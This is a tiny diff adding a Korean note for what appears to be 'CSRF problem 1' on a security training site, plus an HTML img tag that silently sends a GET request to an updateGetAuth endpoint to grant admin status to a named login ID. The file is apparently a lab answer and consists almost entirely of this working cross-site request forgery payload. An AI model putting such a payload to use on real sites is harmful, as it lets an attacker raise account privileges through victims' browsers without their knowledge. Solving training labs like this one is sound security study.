@@ -1,0 +1,6 @@
+csrf 1번 문제
+
+copy URL 로 알아내야함
+
+<img src="https://elms1.skinfosec.co.kr:8082/bbs11/updateGetAuth?loginId=alsl1101@qwer.com&adminYn=2"></br>
+
